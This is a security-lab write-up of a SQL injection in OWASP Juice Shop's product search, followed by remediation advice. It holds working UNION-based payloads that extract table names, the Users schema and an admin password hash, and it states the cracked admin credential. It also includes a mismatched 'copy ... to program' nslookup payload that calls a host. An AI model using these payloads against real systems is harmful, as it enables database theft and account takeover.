# 1 - SQL Injection in Product Search
**Category:** A03 – Injection

---
## Overview
During testing of the product search functionality in OWASP Juice Shop, a **SQL Injection vulnerability** was discovered.  
The application fails to properly sanitize user input before embedding it into SQL queries, allowing attackers to manipulate the query logic and extract sensitive data from the underlying SQLite database.

---
## Proof of Concept

### Vulnerable Query Construction
```sql
SELECT * FROM Products 
WHERE (
  (name LIKE '% %' 
   OR description LIKE '%'copy (SELECT '') to program 'nslookup http://0.0.0.0:8000/' %')
  AND deletedAt IS NULL
) 
ORDER BY name;
```
This payload modified the SQL logic, demonstrating injection.

### Database Enumeration (tables)
```sql
%')) UNION SELECT 1, '', '', 0, 0, '', '', '', name
FROM sqlite_master
WHERE type='table'
LIMIT 1 OFFSET 0 -- 
```

**Tables discovered:**
- Addresses  
- BasketItems  
- Baskets  
- Captchas  
- Cards  
- Challenges  
- Complaints  
- Deliveries  
- Feedbacks  
- ImageCaptchas  
- Memories  
- PrivacyRequests  
- Products  
- Quantities  
- Recycles  
- SecurityAnswers  
- SecurityQuestions  
- Users  
- Wallets  
- sqlite_sequence

### Users Table Schema (extracted)
```sql
%')) UNION SELECT 1, '', '', 0, 0, '', '', '', sql
FROM sqlite_master
WHERE tbl_name = 'Users' AND type = 'table'
LIMIT 1 OFFSET 0; -- 
```

**Schema fields identified:**
- `id` — INTEGER, primary key  
- `username` — VARCHAR(255)  
- `email` — VARCHAR(255), unique  
- `password` — VARCHAR(255)  
- `role` — VARCHAR(255)  
- `deluxeToken` — VARCHAR(255)  
- `lastLoginIp` — VARCHAR(255)  
- `profileImage` — VARCHAR(255)  
- `totpSecret` — VARCHAR(255)  
- `isActive` — TINYINT(1)  
- `createdAt` — DATETIME (NOT NULL)  
- `updatedAt` — DATETIME (NOT NULL)  
- `deletedAt` — DATETIME (NULL)

### Sensitive Data Disclosure (example response)
```json
{
  "id": 1,
  "name": "admin@juice-sh.op",
  "description": "0192023a7bbd73250516f069df18b500",
  "price": 0,
  "deluxePrice": 0
}
```

This hash is an MD5 Hash, and the unhashed password was found at https://crackstation.net/ 

![Pasted image 20250810150612](Pasted%20image%2020250810150612.png)

**Recovered credential (hash cracked):**
```
admin@juice-sh.op : admin123
```

### SecurityAnswers Table (structure)
- `UserId` — INTEGER, UNIQUE, references `Users(id)`, ON DELETE NO ACTION, ON UPDATE CASCADE  
- `SecurityQuestionId` — INTEGER, references `SecurityQuestions(id)`, ON DELETE NO ACTION, ON UPDATE CASCADE  
- `id` — INTEGER, PRIMARY KEY, AUTOINCREMENT  
- `answer` — VARCHAR(255)  
- `createdAt` — DATETIME, NOT NULL  
- `updatedAt` — DATETIME, NOT NULL

---

## Impact
- **Authentication bypass:** Admin account compromised via recovered password.  
- **Data breach:** Disclosure of usernames, emails, and password hashes.  
- **Lateral movement:** Access to additional sensitive tables (e.g., security answers).  
- **Potential RCE:** Use of `copy ... to program`-style payloads indicates risk if backend/DB integrations are misconfigured.

**Severity:** Critical (CVSS high/critical range)

---

## Recommendations
1. **Use parameterized queries / prepared statements** everywhere user input touches SQL.  
2. **Input validation/allowlisting** for search parameters (reject control characters, quotes, SQL metacharacters).  
3. **Harden credential storage:** Replace MD5 with a Hashing algorithm and per-user salts.  
4. **Least-privilege DB account:** Restrict access to schema tables (`sqlite_master`) and unnecessary permissions.  
5. **Error handling:** Return generic errors; avoid leaking SQL/stack details.  
6. **Defense-in-depth:** Web Application Firewall (WAF) rules for common SQLi patterns; monitoring/alerting on anomalies.  
